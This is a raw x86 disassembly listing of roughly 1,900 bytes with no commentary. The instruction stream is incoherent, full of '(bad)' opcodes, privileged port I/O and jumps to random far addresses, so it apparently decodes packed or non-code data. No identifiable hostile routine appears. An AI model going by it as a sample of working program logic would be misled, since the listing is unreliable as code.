  4168c1:	fnstcw WORD PTR [edi-0x50]
  4168c4:	jp     0x416917
  4168c6:	sub    al,0x55
  4168c8:	(bad)  
  4168c9:	jmp    0x416900
  4168cb:	dec    esp
  4168cc:	jo     0x4168d9
  4168ce:	add    DWORD PTR [edi],ebp
  4168d0:	gs (bad) 
  4168d2:	pop    ebp
  4168d3:	cmp    BYTE PTR [edi],ah
  4168d5:	cli    
  4168d6:	(bad)  
  4168d8:	push   es
  4168d9:	lock retf 0xd978
  4168dd:	in     al,0x70
  4168df:	push   esi
  4168e0:	cmp    al,0xf8
  4168e2:	nop
  4168e3:	xor    DWORD PTR [eax],0x280741a8
  4168e9:	pop    edi
  4168ea:	repz mov ds:0xb0e077fc,al
  4168f0:	xchg   ebp,eax
  4168f1:	jno    0x4168e6
  4168f3:	xchg   esp,eax
  4168f4:	fadd   DWORD PTR [ebx+0x25]
  4168f7:	pop    eax
  4168f8:	jmp    0x7556:0x379ec357
  4168ff:	ja     0x416889
  416901:	neg    BYTE PTR ss:[esi+eiz*8-0x80]
  416906:	push   esp
  416907:	sub    DWORD PTR [ebp-0x45],esi
  41690a:	fldz   
  41690c:	sub    ebp,DWORD PTR [ecx+0x7ae60b9c]
  416912:	call   0x2beb2ea1
  416917:	(bad)  
  416918:	adc    edi,esp
  41691a:	push   0xc2937b22
  41691f:	mov    al,bl
  416921:	mov    bl,BYTE PTR [esi+0x4b18c5eb]
  416927:	push   ebp
  416928:	mov    ah,0xce
  41692a:	or     DWORD PTR [edx-0x70],ecx
  41692d:	xor    bh,ch
  41692f:	fimul  DWORD PTR [edi-0x6a]
  416932:	lea    esp,[ebx]
  416934:	fs jb  0x41696b
  416937:	lahf   
  416938:	push   es
  416939:	jmp    0x8a19:0xbb42e51f
  416940:	fistp  QWORD PTR [ebp+0x27420632]
  416946:	and    edx,ebx
  416948:	arpl   di,di
  41694a:	gs push cs
  41694c:	mov    cl,0x35
  41694e:	jno    0x41698d
  416950:	pop    es
  416951:	add    dh,BYTE PTR [edi+0x45b2bc52]
  416957:	sahf   
  416958:	jo     0x4169b1
  41695a:	test   al,0x9d
  41695c:	mov    dl,0xdb
  41695e:	jg     0x4169dc
  416960:	xchg   DWORD PTR [eax-0x57200821],edx
  416966:	retf   0x1c59
  416969:	sub    BYTE PTR [ebx+0x4abd3182],0x25
  416970:	lods   al,BYTE PTR ds:[esi]
  416971:	imul   edi,esi,0x55
  416974:	cs jge 0x4169d2
  416977:	into   
  416978:	dec    ebp
  416979:	xor    al,0xb1
  41697b:	repnz test al,0x9f
  41697e:	shr    BYTE PTR [edx+0x48],0x5c
  416982:	pop    ds
  416983:	jnp    0x4169e4
  416985:	push   0x831d4612
  41698a:	mov    bl,0x59
  41698c:	(bad)  
  41698d:	pop    eax
  41698e:	sub    al,0xac
  416990:	adc    esp,DWORD PTR [ecx+0x31]
  416993:	rcr    BYTE PTR [ecx+ebx*1-0x34bcf5a0],cl
  41699a:	fdivp  st(2),st
  41699c:	mov    ?,WORD PTR [esi]
  41699e:	(bad)  [edi+0x26f8919c]
  4169a4:	loope  0x4169a9
  4169a6:	shl    BYTE PTR [edx],0x17
  4169a9:	inc    ecx
  4169aa:	pop    es
  4169ab:	shr    ebp,1
  4169ad:	jge    0x416974
  4169af:	mov    edx,0x3cbe8a8d
  4169b4:	xchg   ecx,ecx
  4169b6:	inc    edi
  4169b7:	adc    DWORD PTR [ebx-0x3d7aef55],0xffffff8c
  4169be:	mov    ah,0xb8
  4169c0:	iret   
  4169c1:	mov    al,0x89
  4169c3:	adc    eax,DWORD PTR [edx]
  4169c5:	add    edi,DWORD PTR [ebx]
  4169c7:	mov    ah,0xde
  4169c9:	push   es
  4169ca:	mov    al,ds:0xe6e5cf52
  4169cf:	sub    al,0x92
  4169d1:	cld    
  4169d2:	ss mov bh,0x29
  4169d5:	in     al,0x8d
  4169d7:	cmp    DWORD PTR [esi-0x57aa2589],edi
  4169dd:	clc    
  4169de:	pusha  
  4169df:	xlat   BYTE PTR ds:[ebx]
  4169e0:	sub    al,0x7b
  4169e2:	inc    edi
  4169e3:	or     BYTE PTR [esi+0x7eb9ef3e],al
  4169e9:	jp     0x4169cd
  4169eb:	out    dx,eax
  4169ec:	ds cmc 
  4169ee:	sub    DWORD PTR [ebp-0x5e],0xb2d56932
  4169f5:	and    BYTE PTR [esi+0x6b],0x61
  4169f9:	adc    BYTE PTR gs:[edx-0x55],dl
  4169fd:	cmp    DWORD PTR [ebx+0x79],esp
  416a00:	jecxz  0x416a0b
  416a02:	das    
  416a03:	push   esp
  416a04:	sub    BYTE PTR [edi+0x174be84f],dl
  416a0a:	or     BYTE PTR [ebp-0x6c],ch
  416a0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a0e:	lds    ebx,FWORD PTR [edx-0x44]
  416a11:	sub    BYTE PTR [eax],bl
  416a13:	pop    eax
  416a14:	ja     0x4169b1
  416a16:	dec    esp
  416a17:	les    eax,FWORD PTR [ecx+esi*8]
  416a1a:	sbb    eax,0x69d5a6a0
  416a1f:	xor    dl,bl
  416a21:	popa   
  416a22:	daa    
  416a23:	push   es
  416a24:	xor    eax,0x19742d1d
  416a29:	into   
  416a2a:	cmp    al,0xb0
  416a2c:	mov    bh,0x6b
  416a2e:	out    0x9,al
  416a30:	mov    ah,0x4
  416a32:	and    eax,0xb3b2ba44
  416a37:	nop
  416a38:	push   ebx
  416a39:	outs   dx,BYTE PTR ds:[esi]
  416a3a:	(bad)  
  416a3b:	cmp    DWORD PTR [eax+eax*2],ebx
  416a3e:	and    al,0x3e
  416a40:	jge    0x4169d5
  416a42:	sub    DWORD PTR [ecx+ebx*1+0x2],eax
  416a46:	sbb    DWORD PTR [edi+0x125dde3a],edi
  416a4c:	jmp    0x9aa638ef
  416a51:	xor    eax,0xb9d106ec
  416a56:	push   eax
  416a57:	fisub  DWORD PTR [ebx-0x3b75f02e]
  416a5d:	xchg   ebx,esi
  416a5f:	pushf  
  416a60:	pop    esi
  416a61:	and    DWORD PTR [esi+0x1e],0x1ae947ff
  416a68:	inc    ecx
  416a69:	adc    al,0x75
  416a6b:	adc    esi,DWORD PTR [edx+eiz*4]
  416a6e:	push   esi
  416a6f:	aam    0xa0
  416a71:	aam    0x84
  416a73:	xchg   ecx,eax
  416a74:	leave  
  416a75:	out    dx,al
  416a76:	ja     0x416aee
  416a78:	out    0x49,al
  416a7a:	push   cs
  416a7b:	int3   
  416a7c:	xchg   edx,eax
  416a7d:	int3   
  416a7e:	ss loop 0x416a39
  416a81:	test   eax,0x39551d18
  416a86:	jg     0x416ad8
  416a88:	jno    0x416aca
  416a8a:	inc    ebp
  416a8b:	test   al,0xa8
  416a8d:	cmp    BYTE PTR [ecx+0x463f4f39],dl
  416a93:	dec    edi
  416a94:	lods   eax,DWORD PTR ds:[esi]
  416a95:	pop    ecx
  416a96:	fnstsw WORD PTR cs:[ebx]
  416a99:	out    0x73,al
  416a9b:	add    ebx,ecx
  416a9d:	adc    edi,edi
  416a9f:	adc    bh,0x57
  416aa2:	and    al,0xa1
  416aa4:	xchg   esp,eax
  416aa5:	fdiv   DWORD PTR [eax+0x5bfe33f0]
  416aab:	mov    ah,0x15
  416aad:	addr16 mov bh,0xa
  416ab0:	mov    esp,0x7939ac29
  416ab5:	pop    es
  416ab6:	xchg   edi,eax
  416ab7:	icebp  
  416ab8:	lock enter 0x244c,0x69
  416abd:	or     dh,BYTE PTR [edx]
  416abf:	aad    0x3e
  416ac1:	stos   BYTE PTR es:[edi],al
  416ac2:	fstp   TBYTE PTR [esi]
  416ac4:	or     DWORD PTR [esi+esi*1+0x34],0xfd821b63
  416acc:	mov    BYTE PTR [esi+0x7f],ah
  416acf:	mov    edi,DWORD PTR [edx]
  416ad1:	dec    ebp
  416ad2:	pop    DWORD PTR [edi-0x57]
  416ad5:	dec    esp
  416ad6:	call   0x6e603d5
  416adb:	fdivr  DWORD PTR [edi-0x5424ddd6]
  416ae1:	push   ss
  416ae2:	pop    ebx
  416ae3:	xor    al,0x9a
  416ae5:	popf   
  416ae6:	pop    es
  416ae7:	dec    esi
  416ae8:	push   ebp
  416ae9:	sub    al,0xe3
  416aeb:	(bad)  
  416aec:	lods   al,BYTE PTR ds:[esi]
  416aed:	repz aad 0x60
  416af0:	pop    edi
  416af1:	out    0xac,al
  416af3:	adc    bl,BYTE PTR [edx+0x3302bc26]
  416af9:	mov    eax,0x751d03c3
  416afe:	mov    edi,0xd6d9cb7
  416b03:	out    dx,eax
  416b04:	shr    DWORD PTR [edx-0x48],0x22
  416b08:	test   DWORD PTR [edx+0x6b],0xff54455b
  416b0f:	add    al,0xdb
  416b11:	imul   ebp,DWORD PTR [eax-0x61],0xffffffbd
  416b15:	or     DWORD PTR [eax-0x7c],0xebbf68d1
  416b1c:	cdq    
  416b1d:	aad    0x80
  416b1f:	adc    DWORD PTR es:[eax-0x1d],edx
  416b23:	stos   BYTE PTR es:[edi],al
  416b24:	in     eax,dx
  416b25:	mul    DWORD PTR [ebp-0x2c]
  416b28:	test   BYTE PTR [esi-0x6],dl
  416b2b:	push   edi
  416b2c:	pop    ebx
  416b2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b2e:	(bad)  
  416b2f:	(bad)  
  416b30:	adc    al,0xf5
  416b32:	sbb    ecx,esi
  416b34:	pop    es
  416b35:	lods   al,BYTE PTR ds:[esi]
  416b36:	aas    
  416b37:	and    eax,0xee02efbc
  416b3c:	dec    ecx
  416b3d:	fpatan 
  416b3f:	loope  0x416b75
  416b41:	xor    eax,0xf18d1e1c
  416b46:	push   es
  416b47:	shr    BYTE PTR [ebx],cl
  416b49:	(bad)  
  416b4a:	je     0x416b70
  416b4c:	mov    al,BYTE PTR [ecx+0x22095f61]
  416b52:	cmp    BYTE PTR [ebx],bh
  416b54:	dec    edx
  416b55:	rcl    al,cl
  416b57:	jmp    0x416bd0
  416b59:	add    eax,0x76119231
  416b5e:	arpl   WORD PTR [esi+0x5a],di
  416b61:	cmp    eax,0xf2553815
  416b66:	test   eax,0x6c6eda6b
  416b6b:	pop    ds
  416b6c:	jmp    0xf7d555f8
  416b71:	fdivr  QWORD PTR [edi-0x7a]
  416b74:	push   0x5c
  416b76:	push   ecx
  416b77:	xor    eax,ebx
  416b79:	mov    ebp,?
  416b7b:	push   ebx
  416b7c:	and    eax,DWORD PTR [edi+0x7d7797f2]
  416b82:	gs push ebx
  416b84:	out    dx,eax
  416b85:	mov    cs,WORD PTR [edi]
  416b87:	stos   BYTE PTR es:[edi],al
  416b88:	in     eax,dx
  416b89:	cmp    DWORD PTR [esi+ebx*2+0x690eb9e6],esp
  416b90:	adc    al,0x8f
  416b92:	gs inc edx
  416b94:	ins    DWORD PTR es:[edi],dx
  416b95:	retf   
  416b96:	inc    ebp
  416b97:	cmp    esi,esp
  416b99:	jg     0x416be4
  416b9b:	jae    0x416bfd
  416b9d:	xchg   edi,eax
  416b9e:	outs   dx,DWORD PTR ds:[esi]
  416b9f:	aam    0xf3
  416ba1:	cmc    
  416ba2:	es inc edi
  416ba4:	hlt    
  416ba5:	push   ebx
  416ba6:	or     DWORD PTR [ebx],eax
  416ba8:	sbb    BYTE PTR [ebp+0x55],0x69
  416bac:	popa   
  416bad:	addr16 mov al,ds:0xc24e
  416bb1:	cwde   
  416bb2:	inc    esi
  416bb3:	test   BYTE PTR [esi+ecx*4+0x19],bl
  416bb7:	inc    ebp
  416bb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bb9:	aam    0xa8
  416bbb:	jmp    0x416c22
  416bbd:	pop    esp
  416bbe:	mov    eax,ds:0x161e7e49
  416bc3:	mov    ?,WORD PTR [edx+ecx*2+0x11a7278e]
  416bca:	pop    es
  416bcb:	jns    0x416b6b
  416bcd:	dec    eax
  416bce:	pop    ss
  416bcf:	push   edi
  416bd0:	mov    ecx,0x473d34a0
  416bd5:	add    al,0x94
  416bd7:	and    BYTE PTR [ebx+0x74b7b92c],bl
  416bdd:	jo     0x416bdf
  416bdf:	test   dh,0x8f
  416be2:	mov    bl,0x83
  416be4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416be5:	repnz jmp 0x7b8f:0x28a8ee82
  416bed:	jmp    0x6734680
  416bf2:	popa   
  416bf3:	sub    DWORD PTR [eax+0x5d9f9a7d],0x41f19a2c
  416bfd:	jle    0x416c13
  416bff:	mov    al,0x28
  416c01:	pop    eax
  416c02:	jno    0x416baa
  416c04:	sub    eax,0xa5b16351
  416c09:	or     esp,DWORD PTR [ecx]
  416c0b:	test   BYTE PTR [ecx-0x72b3fec1],0x2f
  416c12:	jb     0x416ba3
  416c14:	addr16 enter 0x8974,0x2d
  416c19:	dec    ecx
  416c1a:	sti    
  416c1b:	shl    DWORD PTR [edi-0x19e6f00],1
  416c21:	int3   
  416c22:	xchg   edi,eax
  416c23:	mov    ds:0x850d162e,al
  416c28:	pop    ecx
  416c29:	dec    esp
  416c2a:	idiv   ebx
  416c2c:	xchg   edx,eax
  416c2d:	cmp    al,0x19
  416c2f:	cmp    ecx,DWORD PTR [ecx-0x13]
  416c32:	push   edx
  416c33:	mov    ds:0x1bb67fac,al
  416c38:	imul   eax,DWORD PTR [esp+esi*4-0x6c01c976],0xfd9a90a9
  416c43:	pop    eax
  416c44:	cld    
  416c45:	xor    eax,0x7fbbbfd9
  416c4a:	xor    eax,0x241b62c4
  416c4f:	mov    cl,0x35
  416c51:	jge    0x416ca4
  416c53:	das    
  416c54:	cmp    dh,bl
  416c56:	test   DWORD PTR [esp+esi*2+0x25],ecx
  416c5a:	mov    ?,WORD PTR [esi+edi*1-0x5e947f52]
  416c61:	mov    esi,0x4f669c8e
  416c66:	add    eax,0xc6e6ad67
  416c6b:	adc    eax,0x3070e0fd
  416c70:	xchg   edx,eax
  416c71:	jle    0x416c36
  416c73:	jbe    0x416c06
  416c75:	or     BYTE PTR [esi+esi*8],cl
  416c78:	pop    ebp
  416c79:	push   cs
  416c7a:	cmp    al,0x4d
  416c7c:	xlat   BYTE PTR ds:[ebx]
  416c7d:	mov    al,0xcb
  416c7f:	push   ecx
  416c80:	sahf   
  416c81:	xor    eax,0xf045abb9
  416c86:	mov    DWORD PTR [edi],esp
  416c88:	test   BYTE PTR [ebp+0x40696eb3],dh
  416c8e:	cmp    DWORD PTR [edi+0x62],ebx
  416c91:	adc    al,0xda
  416c93:	fs pop es
  416c95:	mov    eax,ds:0xf9018afa
  416c9a:	sub    dh,dl
  416c9c:	inc    edi
  416c9d:	xchg   edi,eax
  416c9e:	push   esi
  416c9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ca0:	jg     0x416c25
  416ca2:	push   0x16
  416ca4:	jge    0x416c57
  416ca6:	push   cs
  416ca7:	xchg   DWORD PTR [edx+0x43],edx
  416caa:	and    BYTE PTR [ebp+0x51],0xd5
  416cae:	mov    cl,0xee
  416cb0:	pop    ebp
  416cb1:	lock jnp 0x416c6e
  416cb4:	push   ss
  416cb5:	mov    ebx,0xd613dec8
  416cba:	hlt    
  416cbb:	dec    eax
  416cbc:	and    esp,eax
  416cbe:	rcr    DWORD PTR [edi+0x6c388feb],1
  416cc4:	jo     0x416cee
  416cc6:	test   BYTE PTR [edi+0x40],0xdc
  416cca:	cli    
  416ccb:	sbb    DWORD PTR [eax+ebp*1],edx
  416cce:	iret   
  416ccf:	jecxz  0x416ce0
  416cd1:	adc    al,0x8c
  416cd3:	inc    ebx
  416cd4:	mov    ah,0xef
  416cd6:	jg     0x416cc1
  416cd8:	hlt    
  416cd9:	add    BYTE PTR [edi-0x78],ah
  416cdc:	aaa    
  416cdd:	inc    ebx
  416cde:	in     eax,dx
  416cdf:	mov    ebx,0x1093e1eb
  416ce4:	and    ebx,DWORD PTR [edi-0x1]
  416ce7:	pop    ebx
  416ce8:	mov    ecx,0x78269c02
  416ced:	inc    esp
  416cee:	mov    ebx,ebx
  416cf0:	cld    
  416cf1:	xchg   BYTE PTR [edx+ebp*8+0x4e],al
  416cf5:	and    BYTE PTR [ebp-0x4c],bl
  416cf8:	aad    0x5a
  416cfa:	aad    0xc2
  416cfc:	or     ebp,DWORD PTR [eax]
  416cfe:	inc    ebx
  416cff:	add    edi,DWORD PTR [eax+0x78]
  416d02:	xor    eax,0xa3e59168
  416d07:	scas   eax,DWORD PTR es:[edi]
  416d08:	enter  0xb4c2,0x8d
  416d0c:	mov    DWORD PTR [edx+ebp*2+0x44a967f6],esi
  416d13:	pushf  
  416d14:	adc    al,0x54
  416d16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d17:	jb     0x416d15
  416d19:	cli    
  416d1a:	in     eax,0x9d
  416d1c:	mov    ebp,0xb3201aeb
  416d21:	adc    esi,ecx
  416d23:	jmp    0x416d9f
  416d25:	xor    dh,bl
  416d27:	mov    bl,0x50
  416d29:	fld    DWORD PTR [eax-0x72e4c4fd]
  416d2f:	mov    al,0xb0
  416d31:	or     DWORD PTR [eax],eax
  416d33:	push   edx
  416d34:	xchg   BYTE PTR [edi-0x301407ce],dl
  416d3a:	popf   
  416d3b:	or     al,0xe3
  416d3d:	cmp    al,0xec
  416d3f:	popf   
  416d40:	push   ebp
  416d41:	scas   eax,DWORD PTR es:[edi]
  416d42:	(bad)  
  416d43:	mov    bl,0xe7
  416d45:	sub    DWORD PTR [edx+0x14dd824e],edi
  416d4b:	jne    0x416d38
  416d4d:	icebp  
  416d4e:	ror    BYTE PTR [edi],1
  416d50:	cmp    cl,0xd7
  416d53:	push   ss
  416d54:	add    ebx,0xa0b73120
  416d5a:	pushf  
  416d5b:	das    
  416d5c:	mov    BYTE PTR [edx],ch
  416d5e:	xlat   BYTE PTR ds:[ebx]
  416d5f:	adc    DWORD PTR [edx],esi
  416d61:	in     eax,dx
  416d62:	xchg   esi,eax
  416d63:	rol    DWORD PTR [esi+ebp*2],0x3b
  416d67:	loope  0x416d12
  416d69:	fidivr DWORD PTR [edx+0x6]
  416d6c:	ja     0x416da4
  416d6e:	ss inc ebp
  416d70:	fnstcw WORD PTR [eax]
  416d72:	push   0xc2aae22b
  416d77:	ret    
  416d78:	adc    dl,bh
  416d7a:	ins    BYTE PTR es:[edi],dx
  416d7b:	mov    eax,ds:0x84b5eab3
  416d80:	or     BYTE PTR [edx],al
  416d82:	xor    al,0xcf
  416d84:	rcr    BYTE PTR [edi-0xe3d0c49],1
  416d8a:	iret   
  416d8b:	call   0xcb5113bf
  416d90:	mov    esp,0x2b88e7f2
  416d95:	scas   al,BYTE PTR es:[edi]
  416d96:	adc    DWORD PTR [edx+0x3f],eax
  416d99:	or     bl,BYTE PTR [ecx]
  416d9b:	xchg   edi,eax
  416d9c:	xchg   DWORD PTR [ecx],edi
  416d9e:	pop    esi
  416d9f:	repnz adc edx,esi
  416da2:	add    ebp,DWORD PTR [edi-0x168a8ce5]
  416da8:	inc    eax
  416da9:	outs   dx,BYTE PTR ds:[esi]
  416daa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416dab:	xor    BYTE PTR [ecx],0x30
  416dae:	sub    esi,DWORD PTR [esi+ecx*4]
  416db1:	inc    edi
  416db2:	and    al,0x8a
  416db4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416db5:	in     al,dx
  416db6:	jbe    0x416dd1
  416db8:	and    BYTE PTR [esi+0x48],ah
  416dbb:	stos   DWORD PTR es:[edi],eax
  416dbc:	mov    eax,0x1ca768af
  416dc1:	cmp    eax,DWORD PTR [eax+0x4ae9db5a]
  416dc7:	div    BYTE PTR [eax-0x5f57acb4]
  416dcd:	imul   esi,DWORD PTR [esi-0x52],0x5f
  416dd1:	xor    edi,ebx
  416dd3:	adc    dl,BYTE PTR [edx+0x6b]
  416dd6:	clc    
  416dd7:	popa   
  416dd8:	das    
  416dd9:	aam    0x3b
  416ddb:	retf   0x8e88
  416dde:	sbb    dl,dl
  416de0:	lods   eax,DWORD PTR ds:[esi]
  416de1:	icebp  
  416de2:	fistp  WORD PTR [edx+edi*4]
  416de5:	inc    ebp
  416de6:	ins    DWORD PTR es:[edi],dx
  416de7:	cmp    al,0xc3
  416de9:	push   ebp
  416dea:	(bad)  
  416deb:	xchg   ebp,esp
  416ded:	cwde   
  416dee:	sbb    al,0x8c
  416df0:	fistp  DWORD PTR [ebx]
  416df2:	inc    esi
  416df3:	sbb    BYTE PTR [eax+0x26],ah
  416df6:	cs enter 0xb9b3,0x74
  416dfb:	inc    esp
  416dfc:	pop    ebp
  416dfd:	(bad)  
  416dfe:	fnsave [ebp-0x6ec78c2d]
  416e04:	mov    ebp,0x21317708
  416e09:	repz pop es
  416e0b:	ds push esi
  416e0d:	sahf   
  416e0e:	sub    eax,0x3e1bff24
  416e13:	xor    al,BYTE PTR [ecx-0x53205975]
  416e19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e1a:	(bad)  [edx-0x2e]
  416e1d:	and    BYTE PTR [ebx+eiz*2-0x10d3bd65],al
  416e24:	mov    edx,0x63f90927
  416e29:	xor    BYTE PTR [ebx],0xe9
  416e2c:	in     eax,dx
  416e2d:	push   cs
  416e2e:	mov    al,0xfc
  416e30:	adc    BYTE PTR [esi+0x462aec41],bh
  416e36:	mov    eax,ds:0x95470e42
  416e3b:	aad    0x25
  416e3d:	xor    al,0x9c
  416e3f:	mov    eax,0xd0660fac
  416e44:	mov    cl,0xb4
  416e46:	sub    eax,0x32fc132f
  416e4b:	retf   
  416e4c:	(bad)  
  416e4d:	cdq    
  416e4e:	pop    edi
  416e4f:	pop    DWORD PTR [eax-0x4866cc5e]
  416e55:	je     0x416ec6
  416e57:	bound  eax,QWORD PTR [ecx]
  416e59:	std    
  416e5a:	sbb    ebp,edx
  416e5c:	xchg   esi,eax
  416e5d:	leave  
  416e5e:	and    dh,BYTE PTR [ebx-0x7a]
  416e61:	test   eax,0xe404155e
  416e66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e67:	pusha  
  416e68:	popa   
  416e69:	je     0x416e79
  416e6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e6c:	adc    al,0x29
  416e6e:	retf   
  416e6f:	mov    ds:0xc5881571,al
  416e74:	inc    esp
  416e75:	pop    esi
  416e76:	dec    ebp
  416e77:	cdq    
  416e78:	mov    ah,0xbc
  416e7a:	mov    bh,0xa2
  416e7c:	stos   BYTE PTR es:[edi],al
  416e7d:	adc    DWORD PTR [ebx+0x52f901f9],ecx
  416e83:	aad    0x2b
  416e85:	jno    0x416ef1
  416e87:	sub    eax,0x5eec177b
  416e8c:	jns    0x416ec8
  416e8e:	add    eax,0xa0ec41b5
  416e93:	gs xchg edi,eax
  416e95:	in     al,dx
  416e96:	mov    DWORD PTR [ebx+0xa],ebp
  416e99:	imul   ecx,DWORD PTR [eax-0x407fd667],0xa5139487
  416ea3:	add    al,0x5d
  416ea5:	and    eax,0xfd3244c1
  416eaa:	pop    esi
  416eab:	sub    al,0xc3
  416ead:	test   al,0x8a
  416eaf:	push   ecx
  416eb0:	xor    ch,BYTE PTR [ebx]
  416eb2:	cwde   
  416eb3:	ja     0x416e93
  416eb5:	in     al,0x86
  416eb7:	aas    
  416eb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416eb9:	fxch   st(1)
  416ebb:	or     cl,BYTE PTR [ebx-0x58cacf82]
  416ec1:	ret    
  416ec2:	or     DWORD PTR [esi-0x4f],eax
  416ec5:	addr16 jp 0x416f07
  416ec8:	ret    
  416ec9:	fcmovne st,st(4)
  416ecb:	nop
  416ecc:	or     eax,0x82d9105f
  416ed1:	add    bl,BYTE PTR [ecx]
  416ed3:	stos   DWORD PTR es:[edi],eax
  416ed4:	xor    ebp,DWORD PTR [ebx+0x77]
  416ed7:	data16 or ch,BYTE PTR [esi-0x33]
  416edb:	inc    eax
  416edc:	(bad)  
  416edd:	and    ah,BYTE PTR [esi]
  416edf:	ins    BYTE PTR es:[edi],dx
  416ee0:	inc    esp
  416ee1:	aaa    
  416ee2:	and    BYTE PTR [ebx],bl
  416ee4:	fisubr WORD PTR [ebp+0x52eae173]
  416eea:	ficom  DWORD PTR [ebx+0x543816cf]
  416ef0:	jne    0x416f29
  416ef2:	jns    0x416f2c
  416ef4:	xor    eax,0xa4f67fe2
  416ef9:	loope  0x416ed4
  416efb:	xlat   BYTE PTR ds:[ebx]
  416efc:	rcr    eax,1
  416efe:	dec    ecx
  416eff:	jnp    0x416eb1
  416f01:	jne    0x416f73
  416f03:	shl    BYTE PTR [edx+eiz*1-0x6a],cl
  416f07:	push   esp
  416f08:	push   ds
  416f09:	dec    ebp
  416f0a:	or     DWORD PTR [edi+eiz*4],ebx
  416f0d:	jno    0x416f3b
  416f0f:	mov    dh,0xbf
  416f11:	pusha  
  416f12:	aam    0x45
  416f14:	pushf  
  416f15:	loop   0x416f68
  416f17:	hlt    
  416f18:	leave  
  416f19:	dec    BYTE PTR [ecx-0xc]
  416f1c:	dec    eax
  416f1d:	and    eax,0xc2cc6187
  416f22:	sbb    al,0x71
  416f24:	xor    al,0x41
  416f26:	xchg   BYTE PTR [ebx],bl
  416f28:	dec    ebx
  416f29:	cs pop esp
  416f2b:	add    dl,BYTE PTR [ebx]
  416f2d:	and    BYTE PTR [ebp+0x58],al
  416f30:	inc    ebx
  416f31:	xchg   BYTE PTR [edi],dh
  416f33:	je     0x416f6e
  416f35:	shr    DWORD PTR [ebx-0x80],1
  416f38:	js     0x416f38
  416f3a:	push   esp
  416f3b:	test   al,0x7c
  416f3d:	(bad)  
  416f3e:	sub    bh,dh
  416f40:	ret    0x8043
  416f43:	and    DWORD PTR [eax+ecx*2+0x31],ebx
  416f47:	pop    es
  416f48:	pop    ecx
  416f49:	jno    0x416f7f
  416f4b:	stos   DWORD PTR es:[edi],eax
  416f4c:	lea    esp,[ecx]
  416f4e:	and    cl,BYTE PTR [ecx]
  416f50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f52:	mov    ds:0x616daba1,eax
  416f57:	jbe    0x416f68
  416f59:	cs clc 
  416f5b:	mov    al,0x4a
  416f5d:	int3   
  416f5e:	dec    edx
  416f5f:	cmc    
  416f60:	dec    edi
  416f61:	jb     0x416fe2
  416f63:	test   eax,0xbda9ccf4
  416f68:	jo     0x416f50
  416f6a:	int3   
  416f6b:	mov    db1,ebp
  416f6e:	push   DWORD PTR [ebx]
  416f70:	add    al,0x15
  416f72:	arpl   WORD PTR [ecx+esi*1+0x2b],sp
  416f76:	mov    ds:0xc4111c08,al
  416f7b:	(bad)
  416f7e:	mov    ecx,0x3ea6a251
  416f83:	test   DWORD PTR ds:0xd19031cf,ecx
  416f89:	call   0x7584a8e2
  416f8e:	jmp    FWORD PTR [eax]
  416f90:	ret    0xd613
  416f93:	lods   eax,DWORD PTR ds:[esi]
  416f94:	cmp    DWORD PTR [ebx+0x7012610a],0x35d1f9cc
  416f9e:	bound  ebx,QWORD PTR [ecx+ebx*4-0x54da7453]
  416fa5:	xchg   ebp,eax
  416fa6:	in     eax,dx
  416fa7:	je     0x416fad
  416fa9:	mov    BYTE PTR [ecx+ebp*4-0xaab013c],ch
  416fb0:	or     esi,DWORD PTR [ebx-0x50e8283d]
  416fb6:	mov    esp,0x89868b4d
  416fbb:	es retf 0x7ab3
  416fbf:	pop    ebp
  416fc0:	fidivr DWORD PTR [ecx+0x6dc400f0]
  416fc6:	enter  0x9291,0x4a
  416fca:	jns    0x416f52
  416fcc:	ror    DWORD PTR [ebx+0xa],0xe0
  416fd0:	jle    0x417002
  416fd2:	fnstcw WORD PTR [edx-0x28]
  416fd5:	push   eax
  416fd6:	xchg   ebp,eax
  416fd7:	xchg   ebx,eax
  416fd8:	sbb    ch,BYTE PTR [edi]
  416fda:	or     ebx,DWORD PTR [ebx+0xc]
  416fdd:	aam    0x5a
  416fdf:	mov    ds,WORD PTR [esi+0x23]
  416fe2:	jp     0x416fb8
  416fe4:	rcr    esp,0xc5
  416fe7:	cmp    al,0x42
  416fe9:	dec    ecx
  416fea:	fbld   TBYTE PTR [edx+0x77]
  416fed:	pop    ecx
  416fee:	pop    es
  416fef:	int    0xc7
  416ff1:	in     eax,0xb0
  416ff3:	xchg   edx,eax
  416ff4:	pop    ecx
  416ff5:	jne    0x416f9d
  416ff7:	js     0x417072
  416ff9:	push   esi
  416ffa:	nop
  416ffb:	inc    esi
  416ffc:	dec    eax
  416ffd:	cmc    
  416ffe:	iret   
  416fff:	or     edx,DWORD PTR [edx-0x4d]
  417002:	and    edi,eax
  417004:	ret    
  417005:	mov    cl,0xac
  417007:	jp     0x417042
  417009:	pop    edx
  41700a:	sub    BYTE PTR [edx+0x2f30c647],0x4c
  417011:	add    BYTE PTR [ebp+eax*2-0x34],cl
  417015:	fcomip st,st(6)
  417017:	push   ss
  417018:	or     eax,0xfb16b843
  41701d:	cmp    ch,ch
  41701f:	pop    ss
  417020:	in     al,dx
  417021:	mov    al,0x96
  417023:	mov    ch,0x19
  417025:	(bad)  
  417026:	push   esp
  417027:	adc    DWORD PTR [ebp+0x6b626716],edi
  41702d:	pop    ebx
  41702e:	adc    ebx,0x752e38ef
  417034:	leave  
  417035:	push   ss
  417036:	call   0x3942:0x6a650f57
  41703d:	push   0xffffffb9
  41703f:	jnp    0x4170b2
  417041:	leave  
  417042:	push   0x22996d14
  417047:	cmp    bh,BYTE PTR [ecx-0x3ee08378]
  41704d:	test   al,0xf7
  41704f:	xchg   ebx,eax
  417050:	mov    eax,0x5b009532
  417055:	pop    ebx
  417056:	idiv   dh
  417058:	mov    fs,WORD PTR [edi-0x59]
  41705b:	sub    edx,eax
  41705d:	pop    esi
